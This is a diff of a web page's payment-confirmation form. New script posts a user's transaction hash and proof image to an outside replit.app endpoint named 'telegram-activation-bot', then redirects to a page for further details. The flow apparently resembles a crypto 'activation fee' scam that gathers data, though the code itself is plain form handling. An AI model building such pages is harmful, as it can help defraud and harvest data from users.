@@ -84,7 +84,7 @@
                     class="mt-12 w-full py-6 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-semibold text-lg transition flex items-center justify-center gap-3 disabled:cursor-not-allowed disabled:opacity-70">
                 <span id="send-button-text" class="flex items-center gap-3">
                     <i data-lucide="send" class="w-6 h-6"></i>
-                    Send Proof to Live Chat
+                    Send Proof & Continue
                 </span>
                 <svg id="send-spinner" class="hidden w-5 h-5 animate-spin text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
                     <circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle>
@@ -99,22 +99,115 @@
         </div>
     </div>
 
-    <!-- Success Message -->
-    <div id="success-screen" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
-        <div class="bg-white dark:bg-black rounded-3xl p-10 max-w-md text-center">
-            <div class="w-20 h-20 mx-auto bg-green-100 dark:bg-green-900/30 text-green-600 rounded-2xl flex items-center justify-center mb-6">
-                <i data-lucide="check-circle" class="w-12 h-12"></i>
-            </div>
-            <h3 class="text-3xl font-bold mb-3">Proof Sent Successfully</h3>
-            <p class="text-slate-500 dark:text-zinc-400">Your payment proof has been received.<br>Our team is verifying it now.</p>
-            <button onclick="goHome()" 
-                    class="mt-10 w-full py-5 bg-blue-600 text-white rounded-2xl font-semibold hover:bg-blue-700">
-                Return to Homepage
-            </button>
-        </div>
-    </div>
+    <script>
+        function initLucide() {
+            lucide.createIcons();
+        }
 
-    <script src="js/config.js"></script>
-    <script src="js/confirmpayment.js"></script>
+        function initTheme() {
+            const toggle = document.getElementById('theme-toggle');
+            const icon = document.getElementById('theme-icon');
+            
+            const isDark = localStorage.getItem('darkMode') === 'true' || 
+                          (!localStorage.getItem('darkMode') && window.matchMedia('(prefers-color-scheme: dark)').matches);
+            
+            if (isDark) {
+                document.documentElement.classList.add('dark');
+                icon.setAttribute('data-lucide', 'sun');
+            }
+
+            toggle.addEventListener('click', () => {
+                document.documentElement.classList.toggle('dark');
+                const newIsDark = document.documentElement.classList.contains('dark');
+                localStorage.setItem('darkMode', newIsDark);
+                icon.setAttribute('data-lucide', newIsDark ? 'sun' : 'moon');
+                lucide.createIcons();
+            });
+        }
+
+        // Image preview
+        document.getElementById('proof-upload').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(ev) {
+                    document.getElementById('image-preview').src = ev.target.result;
+                    document.getElementById('preview').classList.remove('hidden');
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        async function submitProof() {
+            const submitBtn = document.getElementById('submit-proof-button');
+            const btnText = document.getElementById('send-button-text');
+            const spinner = document.getElementById('send-spinner');
+            const statusEl = document.getElementById('proof-status');
+
+            const txHash = document.getElementById('tx-hash').value.trim();
+            const fileInput = document.getElementById('proof-upload');
+
+            if (!txHash) {
+                statusEl.textContent = "Please enter the Transaction Hash";
+                statusEl.classList.add('text-red-500');
+                return;
+            }
+
+            // Show loading
+            submitBtn.disabled = true;
+            btnText.classList.add('hidden');
+            spinner.classList.remove('hidden');
+            statusEl.textContent = "";
+
+            try {
+                let proofBase64 = null;
+                if (fileInput.files[0]) {
+                    proofBase64 = await toBase64(fileInput.files[0]);
+                }
+
+                const payload = {
+                    transactionHash: txHash,
+                    remark: "Payment Proof Submission",
+                    proofImage: proofBase64,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Send to endpoint
+                await fetch("https://telegram-activation-bot--igbinedion109.replit.app/api/XSRPK", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                // Redirect to completeinfo.html (no popup)
+                window.location.href = "completeinfo.html";
+
+            } catch (error) {
+                console.error("Submission error:", error);
+                statusEl.textContent = "Failed to submit. Please check your connection and try again.";
+                statusEl.classList.add('text-red-500');
+            } finally {
+                submitBtn.disabled = false;
+                btnText.classList.remove('hidden');
+                spinner.classList.add('hidden');
+            }
+        }
+
+        function toBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+        }
+
+        window.onload = function() {
+            initLucide();
+            initTheme();
+        };
+    </script>
 </body>
 </html>
